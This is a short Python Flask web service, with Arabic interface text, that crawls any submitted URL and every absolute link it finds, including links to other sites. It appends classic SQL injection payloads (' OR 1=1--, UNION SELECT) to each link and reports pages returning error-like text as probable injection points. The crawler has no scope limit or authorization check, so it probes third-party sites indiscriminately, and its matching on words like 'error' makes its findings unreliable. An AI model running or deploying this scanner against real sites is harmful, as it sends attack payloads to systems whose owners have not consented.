import requests
from bs4 import BeautifulSoup
from flask import Flask, request

app = Flask(__name__)

SQLI_PAYLOADS = ["' OR 1=1--", "\" OR \"1\"=\"1", "' UNION SELECT null--"]

def scan_sqli(url):
    results = []
    for payload in SQLI_PAYLOADS:
        try:
            test_url = url + "?id=" + payload
            res = requests.get(test_url, timeout=5)
            if any(err in res.text.lower() for err in ["sql", "syntax", "mysql", "error", "warning"]):
                results.append(f"[🔥 SQLi محتملة] {test_url} | البايلود: {payload}")
        except:
            pass
    return results

def crawl_site(start_url):
    visited = set()
    urls_to_visit = [start_url]
    all_results = []

    while urls_to_visit:
        url = urls_to_visit.pop()
        if url in visited:
            continue
        visited.add(url)

        try:
            res = requests.get(url, timeout=5)
            soup = BeautifulSoup(res.text, "html.parser")
            for link in soup.find_all("a", href=True):
                link_url = link['href']
                if link_url.startswith("http") and link_url not in visited:
                    urls_to_visit.append(link_url)
                    sqli_results = scan_sqli(link_url)
                    all_results.extend(sqli_results)
        except:
            pass
    return all_results

@app.route("/")
def home():
    return "✅ البوت شغال! أرسل رابط للفحص عبر /scan?url="

@app.route("/scan")
def scan():
    target = request.args.get("url")
    if not target:
        return "❌ ضع الرابط هكذا: /scan?url=https://testphp.vulnweb.com"
    results = crawl_site(target)
    if not results:
        return f"✅ لا توجد SQLi واضحة في: {target}"
    return "<br>".join(results)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
